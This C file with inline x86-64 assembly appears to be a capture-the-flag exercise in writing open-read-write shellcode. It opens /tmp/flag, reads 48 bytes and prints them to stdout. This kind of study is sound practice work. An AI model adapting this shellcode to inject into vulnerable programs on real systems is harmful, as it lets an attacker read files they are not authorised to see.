// File name: orw.c
// Compile: gcc -o orw orw.c -masm=intel

__asm__(
    ".global run_sh\n"
    "run_sh:\n"

    "push 0x67\n"
    "mov rax, 0x616c662f706d742f \n"
    "push rax\n"
    "mov rdi, rsp\n"
    "xor rsi, rsi\n"
    "xor rdx, rdx\n"
    "mov rax, 2\n"
    "syscall\n"
    "\n"
    "mov rdi, rax\n"
    "mov rsi, rsp\n"
    "sub rsi, 0x30\n"
    "mov rdx, 0x30\n"
    "mov rax, 0x0\n"
    "syscall\n"
    "\n"
    "mov rdi, 1\n"
    "mov rax, 0x1\n"
    "syscall\n"
    "\n"
    "xor rdi, rdi\n"
    "mov rax, 0x3c\n"
    "syscall");

void run_sh();

int main() { run_sh(); }
